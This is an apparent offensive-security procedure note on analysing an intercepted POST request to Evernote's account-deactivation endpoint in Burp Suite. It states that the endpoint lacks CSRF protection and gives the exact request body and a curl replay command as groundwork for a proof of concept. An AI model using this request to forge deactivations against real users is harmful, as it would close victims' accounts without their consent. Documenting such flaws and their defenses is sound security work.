---
tags:
  - analysis
  - post-request
  - csrf
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/evernote-deactivate-post]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:57.144Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 1bd729bf-dfb1-4b4f-9271-bef84e135e99
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Analyze Captured POST Request

## Summary

This procedure examines the intercepted POST request to Evernote's deactivation endpoint in Burp Suite, identifying key parameters and confirming the lack of CSRF protection for exploitation.

## Description

The captured request is a POST to /secure/CloseAccount.action?accountAction=deactivateAccount&json=true with form data including empty strings for password, oneTimeCode, and captchaResponse, plus deactivation reasons. This analysis highlights the vulnerability: no anti-CSRF tokens, allowing forged requests. The procedure uses Burp's interface for inspection and can reference the raw request via curl simulation.

## Requirements

1. Intercepted request in Burp Suite
2. Basic understanding of HTTP requests
3. Optional: curl for replication testing

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens in all state-changing POST endpoints
- Log and alert on requests with empty sensitive fields

## Objectives

1. Document request structure
2. Confirm vulnerability to CSRF
3. Extract parameters for PoC generation

## Instructions

### Step 1: Review Request in Burp

**Context**: Inspect headers, URL, and body to understand the deactivation flow.

In Burp Intercept or HTTP History:

1. Examine URL: POST /secure/CloseAccount.action?accountAction=deactivateAccount&json=true
2. Check headers: Content-Type: application/x-www-form-urlencoded, Cookie: session tokens
3. Analyze body: password=&oneTimeCode=&captchaResponse=&reasons[analytic]=specify-reason-different-app&reasons[i18nKey]=CloseAccountAction.accountActionSurvey.differentApp&reasons[checked]=true&otherReason=

> Note absence of CSRF token; forward request to complete capture without deactivating.

### Step 2: Simulate with Curl

**Context**: Replicate the request outside Burp to validate parameters.

Execute [[commands/evernote-deactivate-post]] to test:

```bash
curl -X POST 'https://www.evernote.com/secure/CloseAccount.action?accountAction=deactivateAccount&json=true' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: [your-session-cookies]' \
  -d 'password=&oneTimeCode=&captchaResponse=&reasons[analytic]=specify-reason-different-app&reasons[i18nKey]=CloseAccountAction.accountActionSurvey.differentApp&reasons[checked]=true&otherReason='
```

> Expected JSON response; use only on test account.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used

- [[commands/evernote-deactivate-post]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- analysis
- post-request
- csrf
